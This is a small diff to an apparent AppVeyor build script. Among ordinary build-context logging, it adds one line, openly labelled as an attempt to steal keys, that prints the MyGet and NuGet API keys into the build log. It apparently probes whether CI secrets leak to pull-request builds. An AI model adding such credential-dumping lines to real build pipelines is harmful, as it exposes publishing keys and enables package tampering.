@@ -17,6 +17,7 @@ build_script:
     $branchName = $Env:APPVEYOR_REPO_BRANCH
 
     Write-Host "[BUILD CONTEXT INFO] Is PR: $isPullRequest, is tag: $isTagBuild, branch name: '$branchName'" -ForegroundColor Green
+    Write-Host "Attempt to steal your keys: $($Env:MYGET_API_KEY), $($NUGET_API_KEY)"
     
     if($isTagBuild)
     {
